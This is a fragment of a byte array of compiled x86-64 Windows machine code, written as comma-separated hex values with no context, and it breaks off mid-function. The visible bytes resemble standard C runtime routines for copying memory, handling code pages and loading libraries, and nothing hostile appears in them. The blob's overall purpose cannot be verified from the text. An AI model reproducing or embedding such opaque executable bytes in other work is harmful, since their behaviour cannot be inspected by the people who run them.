0x0, 0x0, 0x44, 0x8d, 0x4a, 0x7c, 0xf, 0x10, 0x0, 0xf, 0x10, 0x48, 0x10, 0xf, 0x11, 0x1, 0xf, 0x10, 0x40, 0x20, 0xf, 0x11, 0x49, 0x10, 0xf, 0x10, 0x48, 0x30, 0xf, 0x11, 0x41, 0x20, 0xf, 0x10, 0x40, 0x40, 0xf, 0x11, 0x49, 0x30, 0xf, 0x10, 0x48, 0x50, 0xf, 0x11, 0x41, 0x40, 0xf, 0x10, 0x40, 0x60, 0xf, 0x11, 0x49, 0x50, 0xf, 0x10, 0x48, 0x70, 0x49, 0x3, 0xc1, 0xf, 0x11, 0x41, 0x60, 0x49, 0x3, 0xc9, 0xf, 0x11, 0x49, 0xf0, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xb6, 0xf, 0x10, 0x0, 0xf, 0x10, 0x48, 0x10, 0x48, 0x8b, 0x40, 0x20, 0xf, 0x11, 0x1, 0xf, 0x11, 0x49, 0x10, 0x48, 0x89, 0x41, 0x20, 0x48, 0x8b, 0xcb, 0x48, 0x8d, 0x44, 0x24, 0x40, 0xf, 0x10, 0x0, 0xf, 0x10, 0x48, 0x10, 0xf, 0x11, 0x1, 0xf, 0x10, 0x40, 0x20, 0xf, 0x11, 0x49, 0x10, 0xf, 0x10, 0x48, 0x30, 0xf, 0x11, 0x41, 0x20, 0xf, 0x10, 0x40, 0x40, 0xf, 0x11, 0x49, 0x30, 0xf, 0x10, 0x48, 0x50, 0xf, 0x11, 0x41, 0x40, 0xf, 0x10, 0x40, 0x60, 0xf, 0x11, 0x49, 0x50, 0xf, 0x10, 0x48, 0x70, 0x49, 0x3, 0xc1, 0xf, 0x11, 0x41, 0x60, 0x49, 0x3, 0xc9, 0xf, 0x11, 0x49, 0xf0, 0x48, 0x83, 0xea, 0x1, 0x75, 0xb6, 0xf, 0x10, 0x0, 0xf, 0x10, 0x48, 0x10, 0x48, 0x8b, 0x40, 0x20, 0xf, 0x11, 0x1, 0xf, 0x11, 0x49, 0x10, 0x48, 0x89, 0x41, 0x20, 0x8b, 0xcf, 0x21, 0x13, 0x48, 0x8b, 0xd3, 0xe8, 0x37, 0x2, 0x0, 0x0, 0x83, 0xcf, 0xff, 0x8b, 0xf0, 0x3b, 0xc7, 0x75, 0x1a, 0xe8, 0xc5, 0xeb, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x4f, 0xec, 0xff, 0xff, 0x8b, 0xc7, 0xe9, 0xc7, 0x0, 0x0, 0x0, 0x45, 0x84, 0xf6, 0x75, 0x5, 0xe8, 0x56, 0x1c, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x88, 0x88, 0x0, 0x0, 0x0, 0x8b, 0xc7, 0xf0, 0xf, 0xc1, 0x1, 0x3, 0xc7, 0x75, 0x1f, 0x48, 0x8b, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x88, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x5, 0x81, 0x11, 0x1, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0x5, 0xe8, 0x7, 0xec, 0xff, 0xff, 0xc7, 0x3, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x48, 0x89, 0x98, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x8b, 0x88, 0xa8, 0x3, 0x0, 0x0, 0x85, 0xd, 0x8, 0x19, 0x1, 0x0, 0x75, 0x54, 0x48, 0x8d, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4c, 0x24, 0x24, 0x48, 0x8d, 0x85, 0xa8, 0x1, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0xb8, 0x5, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0x89, 0x44, 0x24, 0x24, 0x89, 0x44, 0x24, 0x28, 0xe8, 0xf8, 0xf8, 0xff, 0xff, 0x45, 0x84, 0xf6, 0x74, 0x11, 0x48, 0x8b, 0x85, 0xa8, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x8, 0x48, 0x89, 0xd, 0x9a, 0x17, 0x1, 0x0, 0x33, 0xc9, 0xe8, 0x83, 0xeb, 0xff, 0xff, 0x8b, 0xc6, 0x4c, 0x8d, 0x9c, 0x24, 0x70, 0x2, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x20, 0x49, 0x8b, 0x73, 0x28, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5d, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x8b, 0x5, 0x75, 0x18, 0x1, 0x0, 0x85, 0x81, 0xa8, 0x3, 0x0, 0x0, 0x74, 0x13, 0x48, 0x83, 0xb9, 0x90, 0x0, 0x0, 0x0, 0x0, 0x74, 0x9, 0x48, 0x8b, 0x99, 0x88, 0x0, 0x0, 0x0, 0xeb, 0x64, 0xb9, 0x5, 0x0, 0x0, 0x0, 0xe8, 0x20, 0xe5, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x9f, 0x88, 0x0, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x30, 0x48, 0x3b, 0x1e, 0x74, 0x3e, 0x48, 0x85, 0xdb, 0x74, 0x22, 0x83, 0xc8, 0xff, 0xf0, 0xf, 0xc1, 0x3, 0x83, 0xf8, 0x1, 0x75, 0x16, 0x48, 0x8d, 0x5, 0x6e, 0x10, 0x1, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x3b, 0xc8, 0x74, 0x5, 0xe8, 0xef, 0xea, 0xff, 0xff, 0x48, 0x8b, 0x6, 0x48, 0x89, 0x87, 0x88, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x30, 0xf0, 0xff, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0xb9, 0x5, 0x0, 0x0, 0x0, 0xe8, 0x1a, 0xe5, 0xff, 0xff, 0x48, 0x85, 0xdb, 0x74, 0x13, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x35, 0xdb, 0xff, 0xff, 0x90, 0x48, 0x83, 0xec, 0x28, 0x80, 0x3d, 0xe1, 0x1f, 0x1, 0x0, 0x0, 0x75, 0x4c, 0x48, 0x8d, 0xd, 0x4c, 0x13, 0x1, 0x0, 0x48, 0x89, 0xd, 0xbd, 0x1f, 0x1, 0x0, 0x48, 0x8d, 0x5, 0xfe, 0xf, 0x1, 0x0, 0x48, 0x8d, 0xd, 0x27, 0x12, 0x1, 0x0, 0x48, 0x89, 0x5, 0xb0, 0x1f, 0x1, 0x0, 0x48, 0x89, 0xd, 0x99, 0x1f, 0x1, 0x0, 0xe8, 0x98, 0xe1, 0xff, 0xff, 0x4c, 0x8d, 0xd, 0x9d, 0x1f, 0x1, 0x0, 0x4c, 0x8b, 0xc0, 0xb2, 0x1, 0xb9, 0xfd, 0xff, 0xff, 0xff, 0xe8, 0x86, 0xfc, 0xff, 0xff, 0xc6, 0x5, 0x93, 0x1f, 0x1, 0x0, 0x1, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x97, 0xe0, 0xff, 0xff, 0x48, 0x8d, 0x15, 0x70, 0x1f, 0x1, 0x0, 0x48, 0x8b, 0xc8, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0xcc, 0xfe, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x6c, 0x24, 0x20, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x5, 0x37, 0xf, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8b, 0xf2, 0xe8, 0x2f, 0xf9, 0xff, 0xff, 0x33, 0xdb, 0x8b, 0xf8, 0x85, 0xc0, 0xf, 0x84, 0x54, 0x2, 0x0, 0x0, 0x4c, 0x8d, 0x25, 0xb4, 0x13, 0x1, 0x0, 0x44, 0x8b, 0xf3, 0x49, 0x8b, 0xc4, 0x8d, 0x6b, 0x1, 0x39, 0x38, 0xf, 0x84, 0x4e, 0x1, 0x0, 0x0, 0x44, 0x3, 0xf5, 0x48, 0x83, 0xc0, 0x30, 0x41, 0x83, 0xfe, 0x5, 0x72, 0xeb, 0x81, 0xff, 0xe8, 0xfd, 0x0, 0x0, 0xf, 0x84, 0x2d, 0x1, 0x0, 0x0, 0xf, 0xb7, 0xcf, 0xff, 0x15, 0x61, 0x6f, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0x1c, 0x1, 0x0, 0x0, 0xb8, 0xe9, 0xfd, 0x0, 0x0, 0x3b, 0xf8, 0x75, 0x2e, 0x48, 0x89, 0x46, 0x4, 0x48, 0x89, 0x9e, 0x20, 0x2, 0x0, 0x0, 0x89, 0x5e, 0x18, 0x66, 0x89, 0x5e, 0x1c, 0x48, 0x8d, 0x7e, 0xc, 0xf, 0xb7, 0xc3, 0xb9, 0x6, 0x0, 0x0, 0x0, 0x66, 0xf3, 0xab, 0x48, 0x8b, 0xce, 0xe8, 0xc7, 0xf9, 0xff, 0xff, 0xe9, 0xe3, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x8b, 0xcf, 0xff, 0x15, 0x2d, 0x6f, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0xc4, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x4e, 0x18, 0x33, 0xd2, 0x41, 0xb8, 0x1, 0x1, 0x0, 0x0, 0xe8, 0x8c, 0xa5, 0xff, 0xff, 0x83, 0x7c, 0x24, 0x20, 0x2, 0x89, 0x7e, 0x4, 0x48, 0x89, 0x9e, 0x20, 0x2, 0x0, 0x0, 0xf, 0x85, 0x94, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x26, 0x38, 0x5c, 0x24, 0x26, 0x74, 0x2c, 0x38, 0x59, 0x1, 0x74, 0x27, 0xf, 0xb6, 0x41, 0x1, 0xf, 0xb6, 0x11, 0x3b, 0xd0, 0x77, 0x14, 0x2b, 0xc2, 0x8d, 0x7a, 0x1, 0x8d, 0x14, 0x28, 0x80, 0x4c, 0x37, 0x18, 0x4, 0x3, 0xfd, 0x48, 0x2b, 0xd5, 0x75, 0xf4, 0x48, 0x83, 0xc1, 0x2, 0x38, 0x19, 0x75, 0xd4, 0x48, 0x8d, 0x46, 0x1a, 0xb9, 0xfe, 0x0, 0x0, 0x0, 0x80, 0x8, 0x8, 0x48, 0x3, 0xc5, 0x48, 0x2b, 0xcd, 0x75, 0xf5, 0x8b, 0x4e, 0x4, 0x81, 0xe9, 0xa4, 0x3, 0x0, 0x0, 0x74, 0x2e, 0x83, 0xe9, 0x4, 0x74, 0x20, 0x83, 0xe9, 0xd, 0x74, 0x12, 0x3b, 0xcd, 0x74, 0x5, 0x48, 0x8b, 0xc3, 0xeb, 0x22, 0x48, 0x8b, 0x5, 0x47, 0x84, 0x0, 0x0, 0xeb, 0x19, 0x48, 0x8b, 0x5, 0x36, 0x84, 0x0, 0x0, 0xeb, 0x10, 0x48, 0x8b, 0x5, 0x25, 0x84, 0x0, 0x0, 0xeb, 0x7, 0x48, 0x8b, 0x5, 0x14, 0x84, 0x0, 0x0, 0x48, 0x89, 0x86, 0x20, 0x2, 0x0, 0x0, 0xeb, 0x2, 0x8b, 0xeb, 0x89, 0x6e, 0x8, 0xe9, 0xb, 0xff, 0xff, 0xff, 0x39, 0x1d, 0xdb, 0x1d, 0x1, 0x0, 0xf, 0x85, 0xf6, 0x0, 0x0, 0x0, 0x83, 0xc8, 0xff, 0xe9, 0xf8, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x4e, 0x18, 0x33, 0xd2, 0x41, 0xb8, 0x1, 0x1, 0x0, 0x0, 0xe8, 0xb4, 0xa4, 0xff, 0xff, 0x41, 0x8b, 0xc6, 0x4d, 0x8d, 0x4c, 0x24, 0x10, 0x4c, 0x8d, 0x3d, 0x25, 0x12, 0x1, 0x0, 0x41, 0xbe, 0x4, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x1c, 0x40, 0x49, 0xc1, 0xe3, 0x4, 0x4d, 0x3, 0xcb, 0x49, 0x8b, 0xd1, 0x41, 0x38, 0x19, 0x74, 0x3e, 0x38, 0x5a, 0x1, 0x74, 0x39, 0x44, 0xf, 0xb6, 0x2, 0xf, 0xb6, 0x42, 0x1, 0x44, 0x3b, 0xc0, 0x77, 0x24, 0x45, 0x8d, 0x50, 0x1, 0x41, 0x81, 0xfa, 0x1, 0x1, 0x0, 0x0, 0x73, 0x17, 0x41, 0x8a, 0x7, 0x44, 0x3, 0xc5, 0x41, 0x8, 0x44, 0x32, 0x18, 0x44, 0x3, 0xd5, 0xf, 0xb6, 0x42, 0x1, 0x44, 0x3b, 0xc0, 0x76, 0xe0, 0x48, 0x83, 0xc2, 0x2, 0x38, 0x1a, 0x75, 0xc2, 0x49, 0x83, 0xc1, 0x8, 0x4c, 0x3, 0xfd, 0x4c, 0x2b, 0xf5, 0x75, 0xae, 0x89, 0x7e, 0x4, 0x89, 0x6e, 0x8, 0x81, 0xef, 0xa4, 0x3, 0x0, 0x0, 0x74, 0x29, 0x83, 0xef, 0x4, 0x74, 0x1b, 0x83, 0xef, 0xd, 0x74, 0xd, 0x3b, 0xfd, 0x75, 0x22, 0x48, 0x8b, 0x1d, 0x5f, 0x83, 0x0, 0x0, 0xeb, 0x19, 0x48, 0x8b, 0x1d, 0x4e, 0x83, 0x0, 0x0, 0xeb, 0x10, 0x48, 0x8b, 0x1d, 0x3d, 0x83, 0x0, 0x0, 0xeb, 0x7, 0x48, 0x8b, 0x1d, 0x2c, 0x83, 0x0, 0x0, 0x4c, 0x2b, 0xde, 0x48, 0x89, 0x9e, 0x20, 0x2, 0x0, 0x0, 0x48, 0x8d, 0x56, 0xc, 0xb9, 0x6, 0x0, 0x0, 0x0, 0x4b, 0x8d, 0x3c, 0x23, 0xf, 0xb7, 0x44, 0x17, 0xf8, 0x66, 0x89, 0x2, 0x48, 0x8d, 0x52, 0x2, 0x48, 0x2b, 0xcd, 0x75, 0xef, 0xe9, 0x18, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0xce, 0xe8, 0x47, 0xf7, 0xff, 0xff, 0x33, 0xc0, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x33, 0xcc, 0xe8, 0x20, 0x5b, 0x0, 0x0, 0x4c, 0x8d, 0x5c, 0x24, 0x40, 0x49, 0x8b, 0x5b, 0x40, 0x49, 0x8b, 0x6b, 0x48, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x40, 0x8b, 0xda, 0x41, 0x8b, 0xf9, 0x48, 0x8b, 0xd1, 0x41, 0x8b, 0xf0, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0xc4, 0xf1, 0xff, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x30, 0xf, 0xb6, 0xd3, 0x40, 0x84, 0x7c, 0x2, 0x19, 0x75, 0x18, 0x85, 0xf6, 0x74, 0x10, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x8, 0xf, 0xb7, 0x4, 0x51, 0x85, 0xc6, 0x75, 0x4, 0x33, 0xc0, 0xeb, 0x5, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x80, 0x7c, 0x24, 0x38, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0x83, 0xa1, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x74, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0x8b, 0xd1, 0x41, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0xe9, 0x7a, 0xff, 0xff, 0xff, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xff, 0x15, 0xa2, 0x6c, 0x0, 0x0, 0x48, 0x89, 0x5, 0x3b, 0x1c, 0x1, 0x0, 0xff, 0x15, 0x9d, 0x6c, 0x0, 0x0, 0x48, 0x89, 0x5, 0x36, 0x1c, 0x1, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x81, 0xf9, 0x35, 0xc4, 0x0, 0x0, 0x77, 0x20, 0x8d, 0x81, 0xd4, 0x3b, 0xff, 0xff, 0x83, 0xf8, 0x9, 0x77, 0xc, 0x41, 0xba, 0xa7, 0x2, 0x0, 0x0, 0x41, 0xf, 0xa3, 0xc2, 0x72, 0x5, 0x83, 0xf9, 0x2a, 0x75, 0x2f, 0x33, 0xd2, 0xeb, 0x2b, 0x81, 0xf9, 0x98, 0xd6, 0x0, 0x0, 0x74, 0x20, 0x81, 0xf9, 0xa9, 0xde, 0x0, 0x0, 0x76, 0x1b, 0x81, 0xf9, 0xb3, 0xde, 0x0, 0x0, 0x76, 0xe4, 0x81, 0xf9, 0xe8, 0xfd, 0x0, 0x0, 0x74, 0xdc, 0x81, 0xf9, 0xe9, 0xfd, 0x0, 0x0, 0x75, 0x3, 0x83, 0xe2, 0x8, 0x48, 0xff, 0x25, 0x3a, 0x6c, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x8d, 0x81, 0x18, 0x2, 0xff, 0xff, 0x45, 0x8b, 0xd9, 0x83, 0xf8, 0x1, 0x49, 0x8b, 0xd8, 0x41, 0xf, 0x96, 0xc2, 0x33, 0xff, 0x81, 0xf9, 0x35, 0xc4, 0x0, 0x0, 0x77, 0x1c, 0x8d, 0x81, 0xd4, 0x3b, 0xff, 0xff, 0x83, 0xf8, 0x9, 0x77, 0xc, 0x41, 0xb8, 0xa7, 0x2, 0x0, 0x0, 0x41, 0xf, 0xa3, 0xc0, 0x72, 0x33, 0x83, 0xf9, 0x2a, 0xeb, 0x26, 0x81, 0xf9, 0x98, 0xd6, 0x0, 0x0, 0x74, 0x26, 0x81, 0xf9, 0xa9, 0xde, 0x0, 0x0, 0x76, 0x18, 0x81, 0xf9, 0xb3, 0xde, 0x0, 0x0, 0x76, 0x16, 0x81, 0xf9, 0xe8, 0xfd, 0x0, 0x0, 0x74, 0xe, 0x81, 0xf9, 0xe9, 0xfd, 0x0, 0x0, 0x74, 0x6, 0xf, 0xba, 0xf2, 0x7, 0xeb, 0x2, 0x8b, 0xd7, 0x48, 0x8b, 0x44, 0x24, 0x48, 0x45, 0x84, 0xd2, 0x4c, 0x8b, 0x4c, 0x24, 0x40, 0x4c, 0x8b, 0xc0, 0x4c, 0xf, 0x45, 0xc7, 0x4c, 0xf, 0x45, 0xcf, 0x74, 0x7, 0x48, 0x85, 0xc0, 0x74, 0x2, 0x89, 0x38, 0x4c, 0x89, 0x44, 0x24, 0x48, 0x4c, 0x8b, 0xc3, 0x4c, 0x89, 0x4c, 0x24, 0x40, 0x45, 0x8b, 0xcb, 0x48, 0x8b, 0x5c, 0x24, 0x10, 0x5f, 0x48, 0xff, 0x25, 0x93, 0x6b, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x40, 0xff, 0x15, 0x79, 0x6b, 0x0, 0x0, 0x33, 0xf6, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x7, 0x33, 0xc0, 0xe9, 0xc3, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xeb, 0x66, 0x39, 0x30, 0x74, 0x1d, 0x48, 0x83, 0xc8, 0xff, 0x48, 0xff, 0xc0, 0x66, 0x39, 0x74, 0x45, 0x0, 0x75, 0xf6, 0x48, 0x8d, 0x6c, 0x45, 0x0, 0x48, 0x83, 0xc5, 0x2, 0x66, 0x39, 0x75, 0x0, 0x75, 0xe3, 0x48, 0x89, 0x74, 0x24, 0x38, 0x48, 0x2b, 0xeb, 0x48, 0x89, 0x74, 0x24, 0x30, 0x48, 0x83, 0xc5, 0x2, 0x48, 0xd1, 0xfd, 0x4c, 0x8b, 0xc3, 0x44, 0x8b, 0xcd, 0x89, 0x74, 0x24, 0x28, 0x33, 0xd2, 0x48, 0x89, 0x74, 0x24, 0x20, 0x33, 0xc9, 0xe8, 0xcf, 0xfe, 0xff, 0xff, 0x4c, 0x63, 0xf0, 0x85, 0xc0, 0x75, 0xb, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xf, 0x6b, 0x0, 0x0, 0xeb, 0x96, 0x49, 0x8b, 0xce, 0xe8, 0xed, 0x11, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x33, 0xc9, 0xe8, 0xe, 0xe5, 0xff, 0xff, 0xeb, 0xdc, 0x48, 0x89, 0x74, 0x24, 0x38, 0x44, 0x8b, 0xcd, 0x48, 0x89, 0x74, 0x24, 0x30, 0x4c, 0x8b, 0xc3, 0x44, 0x89, 0x74, 0x24, 0x28, 0x33, 0xd2, 0x33, 0xc9, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x81, 0xfe, 0xff, 0xff, 0x85, 0xc0, 0x75, 0xa, 0x48, 0x8b, 0xcf, 0xe8, 0xdd, 0xe4, 0xff, 0xff, 0xeb, 0xa, 0x33, 0xc9, 0xe8, 0xd4, 0xe4, 0xff, 0xff, 0x48, 0x8b, 0xf7, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xb0, 0x6a, 0x0, 0x0, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x8b, 0x7c, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xe8, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf1, 0x48, 0x85, 0xd2, 0x74, 0x1d, 0x33, 0xd2, 0x48, 0x8d, 0x42, 0xe0, 0x48, 0xf7, 0xf3, 0x49, 0x3b, 0xc0, 0x73, 0xf, 0xe8, 0xdb, 0xe3, 0xff, 0xff, 0xc7, 0x0, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc0, 0xeb, 0x41, 0x48, 0x85, 0xf6, 0x74, 0xa, 0xe8, 0x3f, 0x28, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0xeb, 0x2, 0x33, 0xff, 0x48, 0xf, 0xaf, 0xdd, 0x48, 0x8b, 0xce, 0x48, 0x8b, 0xd3, 0xe8, 0x65, 0x28, 0x0, 0x0, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x74, 0x16, 0x48, 0x3b, 0xfb, 0x73, 0x11, 0x48, 0x2b, 0xdf, 0x48, 0x8d, 0xc, 0x38, 0x4c, 0x8b, 0xc3, 0x33, 0xd2, 0xe8, 0x5b, 0xa0, 0xff, 0xff, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x44, 0x8b, 0xf9, 0x4c, 0x8d, 0x35, 0xca, 0x77, 0xff, 0xff, 0x4d, 0x8b, 0xe1, 0x49, 0x8b, 0xe8, 0x4c, 0x8b, 0xea, 0x4b, 0x8b, 0x8c, 0xfe, 0x30, 0xa2, 0x1, 0x0, 0x4c, 0x8b, 0x5, 0xf2, 0x8, 0x1, 0x0, 0x48, 0x83, 0xcf, 0xff, 0x41, 0x8b, 0xc0, 0x49, 0x8b, 0xd0, 0x48, 0x33, 0xd1, 0x83, 0xe0, 0x3f, 0x8a, 0xc8, 0x48, 0xd3, 0xca, 0x48, 0x3b, 0xd7, 0xf, 0x84, 0xea, 0x0, 0x0, 0x0, 0x48, 0x85, 0xd2, 0x74, 0x8, 0x48, 0x8b, 0xc2, 0xe9, 0xdf, 0x0, 0x0, 0x0, 0x49, 0x3b, 0xec, 0xf, 0x84, 0xb9, 0x0, 0x0, 0x0, 0x8b, 0x75, 0x0, 0x49, 0x8b, 0x9c, 0xf6, 0x90, 0xa1, 0x1, 0x0, 0x48, 0x85, 0xdb, 0x74, 0xe, 0x48, 0x3b, 0xdf, 0xf, 0x85, 0xfa, 0x0, 0x0, 0x0, 0xe9, 0x87, 0x0, 0x0, 0x0, 0x4d, 0x8b, 0xb4, 0xf6, 0xe0, 0x7, 0x1, 0x0, 0x33, 0xd2, 0x49, 0x8b, 0xce, 0x41, 0xb8, 0x0, 0x8, 0x0, 0x0, 0xff, 0x15, 0x97, 0x68, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0xf, 0x85, 0xb0, 0x0, 0x0, 0x0, 0xff, 0x15, 0x25, 0x68, 0x0, 0x0, 0x83, 0xf8, 0x57, 0x75, 0x45, 0x8d, 0x58, 0xb0, 0x49, 0x8b, 0xce, 0x44, 0x8b, 0xc3, 0x48, 0x8d, 0x15, 0xa8, 0x79, 0x0, 0x0, 0xe8, 0xa3, 0xd5, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x2c, 0x44, 0x8b, 0xc3, 0x48, 0x8d, 0x15, 0xe5, 0x83, 0x0, 0x0, 0x49, 0x8b, 0xce, 0xe8, 0x8d, 0xd5, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x16, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x49, 0x8b, 0xce, 0xff, 0x15, 0x43, 0x68, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x60, 0x48, 0x8b, 0xc7, 0x4c, 0x8d, 0x35, 0xe1, 0x76, 0xff, 0xff, 0x49, 0x87, 0x84, 0xf6, 0x90, 0xa1, 0x1, 0x0, 0x48, 0x83, 0xc5, 0x4, 0x49, 0x3b, 0xec, 0xf, 0x85, 0x4e, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0x5, 0x5, 0x8, 0x1, 0x0, 0x41, 0x8b, 0xc0, 0xb9, 0x40, 0x0, 0x0, 0x0, 0x83, 0xe0, 0x3f, 0x2b, 0xc8, 0x48, 0xd3, 0xcf, 0x49, 0x33, 0xf8, 0x4b, 0x87, 0xbc, 0xfe, 0x30, 0xa2, 0x1, 0x0, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0x48, 0x8b, 0xc3, 0x4c, 0x8d, 0x35, 0x81, 0x76, 0xff, 0xff, 0x49, 0x87, 0x84, 0xf6, 0x90, 0xa1, 0x1, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x9, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xab, 0x67, 0x0, 0x0, 0x49, 0x8b, 0xd5, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xa7, 0x67, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x8e, 0x4c, 0x8b, 0x5, 0x93, 0x7, 0x1, 0x0, 0xba, 0x40, 0x0, 0x0, 0x0, 0x41, 0x8b, 0xc8, 0x83, 0xe1, 0x3f, 0x2b, 0xd1, 0x8a, 0xca, 0x48, 0x8b, 0xd0, 0x48, 0xd3, 0xca, 0x49, 0x33, 0xd0, 0x4b, 0x87, 0x94, 0xfe, 0x30, 0xa2, 0x1, 0x0, 0xeb, 0x89, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 